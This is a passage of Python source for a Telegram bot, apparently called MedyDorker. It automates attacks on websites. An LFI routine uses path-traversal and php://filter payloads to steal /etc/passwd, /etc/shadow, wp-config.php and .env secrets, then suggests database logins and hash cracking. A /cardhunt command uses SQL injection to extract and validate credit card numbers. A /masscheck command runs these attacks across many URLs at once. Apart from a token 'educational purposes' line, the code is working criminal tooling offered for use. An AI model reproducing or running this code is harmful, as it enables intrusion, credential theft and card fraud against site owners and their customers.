        ("/etc/apache2/apache2.conf", "../../../../../etc/apache2/apache2.conf"),
        ("/etc/nginx/nginx.conf", "../../../../../etc/nginx/nginx.conf"),
    ]
    
    extracted_files = {}
    db_creds = {}
    env_secrets = []
    system_users = []
    
    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=60),
        headers={"User-Agent": p.sqli_scanner.user_agent}
    ) as session:
        
        for file_name, payload in target_files:
            if file_name in extracted_files:
                continue  # Already got this file
            
            try:
                # Build the exploit URL
                test_params = params.copy()
                test_params[vuln_param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                exploit_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))
                
                async with session.get(exploit_url, ssl=False, allow_redirects=True) as resp:
                    content = await resp.text(errors='ignore')
                    
                    # Check if we got the file
                    is_base64 = "php://filter" in payload
                    
                    if is_base64:
                        # Look for base64 content in response
                        import re
                        b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', content)
                        if b64_match:
                            try:
                                decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                                if len(decoded) > 20:
                                    extracted_files[file_name] = decoded
                            except:
                                pass
                    else:
                        # Direct inclusion - look for file signatures
                        if file_name == "/etc/passwd" and "root:" in content and "/bin/" in content:
                            # Extract passwd content
                            lines = []
                            for line in content.split('\n'):
                                if ':' in line and ('/' in line or 'nologin' in line.lower()):
                                    if line.count(':') >= 3:
                                        lines.append(line.strip())
                            if lines:
                                extracted_files[file_name] = '\n'.join(lines[:30])
                        
                        elif file_name == "/etc/shadow" and "root:" in content and "$" in content:
                            extracted_files[file_name] = content[:2000]
                        
                        elif file_name == "wp-config.php" and ("DB_NAME" in content or "DB_USER" in content):
                            extracted_files[file_name] = content[:5000]
                        
                        elif file_name == ".env" and "=" in content and any(x in content.upper() for x in ["KEY", "SECRET", "PASSWORD", "TOKEN"]):
                            extracted_files[file_name] = content[:3000]
                        
                        elif "my.cnf" in file_name and ("[mysql" in content.lower() or "password" in content.lower()):
                            extracted_files[file_name] = content[:2000]
            
            except Exception as e:
                logger.debug(f"LFI extract error for {file_name}: {e}")
    
    # Parse extracted content
    if "wp-config.php" in extracted_files:
        content = extracted_files["wp-config.php"]
        import re
        
        # Extract DB credentials
        db_name = re.search(r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]", content)
        db_user = re.search(r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]", content)
        db_pass = re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]", content)
        db_host = re.search(r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]", content)
        table_prefix = re.search(r"\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]", content)
        
        if db_name: db_creds["DB_NAME"] = db_name.group(1)
        if db_user: db_creds["DB_USER"] = db_user.group(1)
        if db_pass: db_creds["DB_PASSWORD"] = db_pass.group(1)
        if db_host: db_creds["DB_HOST"] = db_host.group(1)
        if table_prefix: db_creds["TABLE_PREFIX"] = table_prefix.group(1)
        
        # Extract WordPress keys/salts
        for key in ["AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY"]:
            match = re.search(rf"define\s*\(\s*['\"]" + key + r"['\"]\s*,\s*['\"]([^'\"]+)['\"]", content)
            if match and len(match.group(1)) > 10:
                db_creds[key] = match.group(1)[:50] + "..."
    
    if ".env" in extracted_files:
        content = extracted_files[".env"]
        for line in content.split('\n'):
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                key, _, value = line.partition('=')
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                if any(x in key.upper() for x in ["KEY", "SECRET", "PASSWORD", "TOKEN", "API"]) and value:
                    env_secrets.append((key, value))
    
    if "/etc/passwd" in extracted_files:
        content = extracted_files["/etc/passwd"]
        for line in content.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 3:
                    username = parts[0]
                    uid = parts[2] if len(parts) > 2 else "?"
                    shell = parts[-1] if len(parts) > 6 else "?"
                    if username and not username.startswith('#'):
                        system_users.append((username, uid, shell))
    
    # Build response
    text = f"━━━━━━━━━━━━━━━━━━━━\n🔓 <b>LFI Extraction Results</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🎯 Target: <code>{_esc(parsed.netloc)}</code>\n\n"
    
    if db_creds:
        text += "<b>💾 DATABASE CREDENTIALS:</b>\n"
        text += "```\n"
        for key, value in db_creds.items():
            if key in ["DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "TABLE_PREFIX"]:
                text += f"{key}: {_esc(value)}\n"
        text += "```\n\n"
        
        # Show exploitation path
        text += "<b>🎯 EXPLOITATION PATH:</b>\n"
        host = db_creds.get("DB_HOST", "localhost")
        if host == "localhost" or host == "127.0.0.1":
            text += "  1. Look for phpMyAdmin/Adminer\n"
            text += "  2. Try <code>/phpmyadmin</code>, <code>/pma</code>, <code>/adminer.php</code>\n"
            text += "  3. If found → Login with creds\n"
            text += "  4. Dump <code>" + _esc(db_creds.get("TABLE_PREFIX", "wp_")) + "users</code> table\n"
        else:
            text += f"  1. Remote DB host: <code>{_esc(host)}</code>\n"
            text += "  2. Try: <code>mysql -h " + _esc(host) + " -u " + _esc(db_creds.get("DB_USER", "user")) + " -p</code>\n"
            text += "  3. Or scan for open port 3306\n"
        text += "\n"
    
    if env_secrets:
        text += f"<b>🔑 .ENV SECRETS ({len(env_secrets)}):</b>\n"
        for key, value in env_secrets[:10]:
            val_preview = value[:30] + "..." if len(value) > 30 else value
            text += f"  <code>{_esc(key)}</code>=<code>{_esc(val_preview)}</code>\n"
        text += "\n"
    
    if system_users:
        text += f"<b>👤 SYSTEM USERS ({len(system_users)}):</b>\n"
        # Show users with login shells (potential SSH targets)
        login_users = [(u, uid, s) for u, uid, s in system_users if "nologin" not in s and "false" not in s]
        if login_users:
            text += "  <i>Users with login shells (SSH targets):</i>\n"
            for username, uid, shell in login_users[:10]:
                text += f"    • <code>{_esc(username)}</code> (UID:{uid}) {_esc(shell)}\n"
        text += "\n"
    
    if "/etc/shadow" in extracted_files:
        text += "<b>🔐 SHADOW FILE EXPOSED!</b>\n"
        text += "  Password hashes available!\n"
        text += "  → Use hashcat/john to crack\n\n"
    
    if not db_creds and not env_secrets and not system_users:
        text += "❌ <b>Could not extract sensitive data</b>\n\n"
        text += "Possible reasons:\n"
        text += "  • LFI filtered/restricted\n"
        text += "  • Different web root path\n"
        text += "  • open_basedir restriction\n\n"
        text += "Try /lfi for detection first."
    else:
        text += "━━━━━━━━━━━━━━━━━━━━\n"
        text += f"<b>📁 Files Extracted: {len(extracted_files)}</b>\n"
        for fname in extracted_files.keys():
            text += f"  ✓ {_esc(fname)}\n"
    
    text += "\n━━━━━━━━━━━━━━━━━━━━"
    
    # Send response (use safe splitting)
    parts = _safe_send_parts(text, 4000)
    for part in parts:
        try:
            await update.message.reply_text(part, parse_mode="HTML")
        except Exception:
            plain = re.sub(r'<[^>]+>', '', part)
            await update.message.reply_text(plain[:4000])


async def cmd_deepscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /deepscan — redirect to /scan (which is now max depth by default)."""
    await update.message.reply_text(
        "ℹ️ <b>/deepscan is deprecated!</b>\n\n"
        "/scan now does MAX DEPTH by default.\n"
        "Redirecting to /scan...",
        parse_mode="HTML"
    )
    # Just call cmd_scan directly
    await cmd_scan(update, context)


async def cmd_cardhunt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cardhunt <url> — Hunt for credit card data via SQLi.
    
    Finds tables containing card-related columns (pan, ccnum, cardnumber, 
    cvv, exp_date, etc.) and extracts valid card data using Luhn validation.
    
    Examples:
        /cardhunt https://example.com/vuln.php?id=1
    """
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text(
            "<b>💳 Card Data Hunter</b>\n\n"
            "<b>Usage:</b> /cardhunt &lt;vulnerable_url&gt;\n\n"
            "Hunts for credit card data via SQL injection:\n"
            "  • Finds tables with card columns (pan, ccnum, cvv...)\n"
            "  • Extracts card numbers with Luhn validation\n"
            "  • Detects card type (Visa, MC, Amex...)\n"
            "  • Saves in SQLi Dumper format\n\n"
            "<b>Supported DBMS:</b>\n"
            "  • MySQL/MariaDB\n"
            "  • Microsoft SQL Server\n"
            "  • PostgreSQL (limited)\n\n"
            "<b>Example:</b>\n"
            "  /cardhunt https://shop.com/product.php?id=1",
            parse_mode="HTML"
        )
        return
    
    target_url = context.args[0]
    if not target_url.startswith("http"):
        target_url = "https://" + target_url
    
    await update.message.reply_text(
        f"💳 <b>Starting card hunt on target...</b>\n\n"
        f"🎯 <code>{target_url}</code>\n\n"
        f"<b>Phase 1:</b> Testing SQLi vulnerability\n"
        f"<b>Phase 2:</b> Finding card-related tables\n"
        f"<b>Phase 3:</b> Extracting & validating cards\n\n"
        f"⏳ This may take 1-3 minutes...",
        parse_mode="HTML"
    )
    
    try:
        import aiohttp
        
        # Phase 1: Test if URL is injectable
        sqli_scanner = p.sqli_scanner
        is_vuln = await sqli_scanner.test_sqli_fast(target_url)
        
        if not is_vuln:
            await update.message.reply_text(
                f"❌ <b>Target not vulnerable to SQLi</b>\n\n"
                f"<code>{target_url}</code>\n\n"
                f"Try:\n"
                f"  • Different parameter (id, cat, page...)\n"
                f"  • Adding single quote to test manually\n"
                f"  • Using /scan on the domain first",
                parse_mode="HTML"
            )
            return
        
        await update.message.reply_text(
            f"✅ <b>Injection point confirmed!</b>\n\n"
            f"🔍 Hunting for card tables...",
            parse_mode="HTML"
        )
        
        # Phase 2 & 3: Hunt for cards
        sqli_dumper = p.sqli_dumper
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=180),
            headers={"User-Agent": sqli_scanner.user_agent}
        ) as session:
            card_results = await sqli_dumper.extract_cards(target_url, session)
        
        if card_results and card_results.get("valid_cards"):
            valid = card_results["valid_cards"]
            total = card_results.get("total_found", len(valid))
            tables = card_results.get("tables_found", [])
            
            # Build response
            text = f"💳 <b>CARD DATA FOUND!</b>\n\n"
            text += f"🎯 Target: <code>{target_url[:50]}...</code>\n"
            text += f"📊 Valid cards: <b>{len(valid)}</b> / {total} tested\n"
            
            if tables:
                text += f"📋 Tables: {', '.join(tables[:5])}\n"
            
            text += f"\n<b>Sample cards (masked):</b>\n"
            
            for i, card in enumerate(valid[:10], 1):
                pan = card.get("pan", card.get("card_number", ""))
                card_type = card.get("_card_type", card.get("card_type", "Unknown"))
                masked = pan[:6] + "******" + pan[-4:] if len(pan) >= 10 else pan
                exp = card.get("exp_date", card.get("expiry", "XX/XX"))
                
                text += f"  {i}. {masked} ({card_type}) - {exp}\n"
            
            if len(valid) > 10:
                text += f"  ... and {len(valid) - 10} more\n"
            
            # Save to file
            from sqli_dumper import DumpedData
            dump = DumpedData(
                url=target_url,
                card_data=valid,
                dbms=card_results.get("dbms", "unknown"),
                database=card_results.get("database", ""),
            )
            saved = sqli_dumper.save_dump(dump, prefix="cardhunt_")
            
            text += f"\n<b>📁 Saved to:</b>\n"
            for ftype, fpath in saved.items():
                fname = fpath.split("/")[-1]
                text += f"  • {fname}\n"
            
            text += f"\n⚠️ <b>Use responsibly. Educational purposes only.</b>"
            
        elif card_results and card_results.get("tables_found"):
            tables = card_results["tables_found"]
            text = f"🔍 <b>Card tables found, but no valid cards extracted</b>\n\n"
            text += f"Tables with card columns:\n"
            for t in tables[:10]:
                text += f"  • {t}\n"
            text += f"\nMay need manual extraction with /scan"
        else:
            text = f"❌ <b>No card data found</b>\n\n"
            text += f"Target vulnerable but:\n"
            text += f"  • No card-related tables found\n"
            text += f"  • Try extracting schema first with /scan\n"
            text += f"  • Check if it's an e-commerce site"
        
        await update.message.reply_text(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Card hunt error: {e}", exc_info=True)
        await update.message.reply_text(
            f"❌ <b>Error during card hunt:</b>\n<code>{str(e)[:200]}</code>",
            parse_mode="HTML"
        )


# ==================== MASS CHECKER ====================

# Global job tracking for concurrent operations
active_jobs: Dict[str, Dict] = {}
job_counter = 0

async def run_single_scan(url: str, job_id: str, chat_id: int, bot, scan_type: str = "full"):
    """Run a single URL scan as background job."""
    p = get_pipeline()
    import aiohttp
    
    try:
        active_jobs[job_id]["status"] = "running"
        active_jobs[job_id]["url"] = url
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout, headers={
            "User-Agent": p.sqli_scanner.user_agent
        }) as session:
            
            result = {
                "url": url,
                "vulnerable": False,
                "sqli": None,
                "cards": [],
                "secrets": [],
                "error": None
            }
            
            # Quick SQLi test
            try:
                is_vuln = await p.sqli_scanner.test_sqli_fast(url, session)
                result["vulnerable"] = is_vuln
                
                if is_vuln and scan_type in ["full", "cardhunt"]:
                    # Try to extract cards
                    card_results = await p.sqli_dumper.extract_cards(url, session)
                    if card_results and card_results.get("valid_cards"):
                        result["cards"] = card_results["valid_cards"]
                    
                    # Get DB info
                    sqli_results = await p.sqli_scanner.scan(url, session)
                    if sqli_results:
                        result["sqli"] = {
                            "dbms": sqli_results[0].dbms,
                            "technique": sqli_results[0].technique,
                            "db": sqli_results[0].current_db,
                        }
            except Exception as e:
                result["error"] = str(e)[:100]
            
            active_jobs[job_id]["result"] = result
            active_jobs[job_id]["status"] = "completed"
            
            return result
            
    except Exception as e:
        active_jobs[job_id]["status"] = "error"
        active_jobs[job_id]["error"] = str(e)
        return {"url": url, "error": str(e)}


async def cmd_masscheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /masscheck — Mass scan multiple URLs concurrently.
    
    Usage:
        /masscheck url1 url2 url3...        — Scan URLs from message
        /masscheck (reply to file)          — Scan URLs from text file
        /masscheck (attach file)            — Scan URLs from attached file
        
    Options:
        fast     — Quick SQLi test only (no card extraction)
        cardhunt — Focus on card data extraction
        
    The bot will:
        - Process URLs concurrently (10 at a time)
        - Report progress every 10 URLs
        - Save results to dumps folder
    """
    global job_counter
    p = get_pipeline()
    
    urls = []
    scan_type = "full"
    
    # Parse options
    args = context.args or []
    if "fast" in [a.lower() for a in args]:
        scan_type = "fast"
        args = [a for a in args if a.lower() != "fast"]
    if "cardhunt" in [a.lower() for a in args]:
        scan_type = "cardhunt"
        args = [a for a in args if a.lower() != "cardhunt"]
    
    # Check for file attachment
    if update.message.document:
        try:
            file = await update.message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            content = file_bytes.decode('utf-8', errors='ignore')
            urls = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {e}")
            return
    
    # Check for reply to file
    elif update.message.reply_to_message and update.message.reply_to_message.document:
        try:
            file = await update.message.reply_to_message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            content = file_bytes.decode('utf-8', errors='ignore')
            urls = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {e}")
            return
    
    # URLs from command arguments
    elif args:
        urls = [arg for arg in args if '.' in arg]  # Basic URL check
    
    if not urls:
        await update.message.reply_text(
            "<b>📋 Mass Checker</b>\n\n"
            "<b>Usage:</b>\n"
            "  /masscheck url1 url2 url3...\n"
            "  /masscheck (attach .txt file)\n"
            "  /masscheck (reply to .txt file)\n\n"
            "<b>Options:</b>\n"
            "  <code>fast</code> — Quick SQLi test only\n"
            "  <code>cardhunt</code> — Focus on card extraction\n\n"
            "<b>Example:</b>\n"
            "  /masscheck https://site1.com/page.php?id=1 https://site2.com/item.php?id=1\n\n"
            "<b>File format:</b> One URL per line\n"
            "<b>Concurrency:</b> 10 URLs at a time\n"
            "<b>Runs in background</b> — /dorkon continues working!",
            parse_mode="HTML"
        )
        return
    
    # Normalize URLs
    normalized = []
    for url in urls:
        if not url.startswith("http"):
            url = "https://" + url
        normalized.append(url)
    urls = normalized
    
    job_counter += 1
    batch_job_id = f"mass_{job_counter}"
    
    await update.message.reply_text(
        f"🚀 <b>Mass Check Started</b>\n\n"
        f"📊 URLs: <b>{len(urls)}</b>\n"
        f"⚙️ Mode: <b>{scan_type}</b>\n"
        f"🔄 Concurrency: <b>10</b>\n"
        f"🆔 Job: <code>{batch_job_id}</code>\n\n"
        f"Running in background — use /jobs to check status\n"
        f"/dorkon continues working!",
        parse_mode="HTML"
    )
    
    # Start mass scan in background
    asyncio.create_task(run_mass_scan(
        urls=urls,
        job_id=batch_job_id,
        chat_id=update.effective_chat.id,
        bot=context.bot,
        scan_type=scan_type,
        user_id=update.effective_user.id
    ))


async def run_mass_scan(urls: List[str], job_id: str, chat_id: int, bot, scan_type: str, user_id: int):
    """Run mass scan with concurrency."""
    global active_jobs
    p = get_pipeline()
    
    active_jobs[job_id] = {
        "type": "mass_scan",
        "total": len(urls),
        "completed": 0,
        "vulnerable": 0,
        "cards_found": 0,
        "status": "running",
        "started": datetime.now().isoformat(),
        "results": []
    }
    
    import aiohttp
    
    semaphore = asyncio.Semaphore(10)  # Max 10 concurrent
    
    async def scan_with_semaphore(url: str, idx: int):
        async with semaphore:
            timeout = aiohttp.ClientTimeout(total=45)
            async with aiohttp.ClientSession(timeout=timeout, headers={
                "User-Agent": p.sqli_scanner.user_agent
            }) as session:
                result = {
                    "url": url,
                    "vulnerable": False,
                    "cards": 0,
                    "dbms": None,
                    "error": None
                }
                
                try:
                    # Quick SQLi test
                    is_vuln = await p.sqli_scanner.test_sqli_fast(url, session)
                    result["vulnerable"] = is_vuln
                    
                    if is_vuln:
                        active_jobs[job_id]["vulnerable"] += 1
                        
                        if scan_type in ["full", "cardhunt"]:
                            # Try card extraction
                            try:
                                card_results = await p.sqli_dumper.extract_cards(url, session)
                                if card_results and card_results.get("valid_cards"):
                                    result["cards"] = len(card_results["valid_cards"])
                                    active_jobs[job_id]["cards_found"] += result["cards"]
                                    result["dbms"] = card_results.get("dbms")
                            except:
                                pass
                except Exception as e:
                    result["error"] = str(e)[:50]
                
                active_jobs[job_id]["completed"] += 1
                active_jobs[job_id]["results"].append(result)
                
                return result
    
    # Progress reporter
    async def report_progress():
        last_reported = 0
        while active_jobs.get(job_id, {}).get("status") == "running":
            await asyncio.sleep(5)
            completed = active_jobs.get(job_id, {}).get("completed", 0)
            total = active_jobs.get(job_id, {}).get("total", 0)
            
            if completed > last_reported and (completed % 10 == 0 or completed == total):
                vuln = active_jobs[job_id]["vulnerable"]
                cards = active_jobs[job_id]["cards_found"]
                
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"📊 <b>Mass Check Progress</b>\n\n"
                         f"✅ {completed}/{total} URLs scanned\n"
                         f"🔓 Vulnerable: <b>{vuln}</b>\n"
                         f"💳 Cards: <b>{cards}</b>",
                    parse_mode="HTML"
                )
                last_reported = completed
    
    # Start progress reporter
    progress_task = asyncio.create_task(report_progress())
    
    try:
        # Run all scans concurrently with semaphore
        tasks = [scan_with_semaphore(url, i) for i, url in enumerate(urls)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        active_jobs[job_id]["status"] = "completed"
        
        # Cancel progress reporter
        progress_task.cancel()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"dumps/masscheck_{timestamp}.json"
        os.makedirs("dumps", exist_ok=True)
        
        with open(results_file, "w") as f:
            json.dump({
                "job_id": job_id,
                "scan_type": scan_type,
                "total_urls": len(urls),
                "vulnerable": active_jobs[job_id]["vulnerable"],
                "cards_found": active_jobs[job_id]["cards_found"],
                "results": active_jobs[job_id]["results"]
            }, f, indent=2)
        
        # Final report
        vuln_urls = [r for r in active_jobs[job_id]["results"] if r.get("vulnerable")]
        card_urls = [r for r in active_jobs[job_id]["results"] if r.get("cards", 0) > 0]
        
        text = f"✅ <b>Mass Check Complete!</b>\n\n"
        text += f"📊 <b>Summary:</b>\n"
        text += f"  Total: {len(urls)}\n"
        text += f"  🔓 Vulnerable: <b>{len(vuln_urls)}</b>\n"
        text += f"  💳 With Cards: <b>{len(card_urls)}</b>\n"
        text += f"  Total Cards: <b>{active_jobs[job_id]['cards_found']}</b>\n\n"
        
        if vuln_urls[:10]:
            text += f"<b>🔓 Vulnerable URLs:</b>\n"
            for r in vuln_urls[:10]:
                cards_text = f" 💳{r['cards']}" if r.get('cards') else ""
                text += f"  • <code>{r['url'][:50]}...</code>{cards_text}\n"
            if len(vuln_urls) > 10:
                text += f"  ... +{len(vuln_urls)-10} more\n"
        
        text += f"\n📁 Saved: <code>{results_file}</code>"
        
        await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Mass scan error: {e}", exc_info=True)
        active_jobs[job_id]["status"] = "error"
        active_jobs[job_id]["error"] = str(e)
        await bot.send_message(
            chat_id=chat_id,
            text=f"❌ <b>Mass check error:</b>\n<code>{str(e)[:200]}</code>",
            parse_mode="HTML"
        )


async def cmd_jobs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /jobs — Show active background jobs."""
    if not active_jobs:
        await update.message.reply_text("No active jobs. Start one with /masscheck or /dorkon")
        return
    
    text = "<b>📋 Active Jobs</b>\n\n"
    
    for job_id, job in active_jobs.items():
        status_emoji = {"running": "🔄", "completed": "✅", "error": "❌"}.get(job["status"], "❓")
        
        if job["type"] == "mass_scan":
            text += f"{status_emoji} <b>{job_id}</b>\n"
            text += f"   {job['completed']}/{job['total']} URLs\n"
            text += f"   🔓 {job['vulnerable']} vuln | 💳 {job['cards_found']} cards\n\n"
        else:
            text += f"{status_emoji} <b>{job_id}</b> — {job['status']}\n\n"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document uploads for mass scanning."""
    doc = update.message.document
    
    if not doc.file_name.endswith(('.txt', '.csv', '.list')):
        return  # Ignore non-text files
    
    await update.message.reply_text(
        "📄 <b>File received!</b>\n\n"
        "Reply to this file with:\n"
        "  /scan — Full deep scan (all features)\n"
        "  /scan quick — Fast deep scan\n"
        "  /scan nosqli — Secrets only\n"
        "  /masscheck — Quick SQLi check\n"
        "  /masscheck cardhunt — Card extraction focus\n\n"
        "💡 <b>Tip:</b> You can also attach the file directly:\n"
        "  Send the file + type <code>/scan</code> in the caption",
        parse_mode="HTML"
    )


# ==================== ENTRY POINT ====================

def main():
    """Main entry point."""
    config = DorkerConfig()
    
    if not config.telegram_bot_token:
        logger.error("No bot token configured! Set DORKER_BOT_TOKEN or update config_v3.py")
        sys.exit(1)
    
    if not HAS_PTB:
        logger.warning("python-telegram-bot not installed, running pipeline without bot interface")
        # Run pipeline directly
        global pipeline
        pipeline = MedyDorkerPipeline(config)
        asyncio.run(pipeline.start())
        return
    
    logger.info("Starting MedyDorker v3.0 Telegram Bot...")
    
    app = Application.builder().token(config.telegram_bot_token).build()
    
    # Register handlers (work in both DM and group chats)
    chat_filter = filters.ChatType.PRIVATE | filters.ChatType.GROUP | filters.ChatType.SUPERGROUP
    
    app.add_handler(CommandHandler("start", cmd_start, filters=chat_filter))
    app.add_handler(CommandHandler("help", cmd_start, filters=chat_filter))
    app.add_handler(CommandHandler("dorkon", cmd_dorkon, filters=chat_filter))
    app.add_handler(CommandHandler("dorkoff", cmd_dorkoff, filters=chat_filter))
    app.add_handler(CommandHandler("status", cmd_status, filters=chat_filter))
    app.add_handler(CommandHandler("dorkstats", cmd_dorkstats, filters=chat_filter))
    app.add_handler(CommandHandler("sqlistats", cmd_sqlistats, filters=chat_filter))
    app.add_handler(CommandHandler("secrets", cmd_secrets, filters=chat_filter))
    app.add_handler(CommandHandler("dumps", cmd_dumps, filters=chat_filter))
    app.add_handler(CommandHandler("categories", cmd_categories, filters=chat_filter))
    app.add_handler(CommandHandler("target", cmd_target, filters=chat_filter))
    app.add_handler(CommandHandler("scan", cmd_scan, filters=chat_filter))
    app.add_handler(CommandHandler("adminfinder", cmd_adminfinder, filters=chat_filter))
    app.add_handler(CommandHandler("lfi", cmd_lfi, filters=chat_filter))
    app.add_handler(CommandHandler("lfiextract", cmd_lfiextract, filters=chat_filter))
    app.add_handler(CommandHandler("cardhunt", cmd_cardhunt, filters=chat_filter))
    app.add_handler(CommandHandler("masscheck", cmd_masscheck, filters=chat_filter))
    app.add_handler(CommandHandler("jobs", cmd_jobs, filters=chat_filter))
    app.add_handler(CommandHandler("deepscan", cmd_deepscan, filters=chat_filter))
    
    # Document handler for file uploads
    from telegram.ext import MessageHandler
    app.add_handler(MessageHandler(filters.Document.ALL & chat_filter, handle_document))
    
    logger.info("Bot handlers registered, starting polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
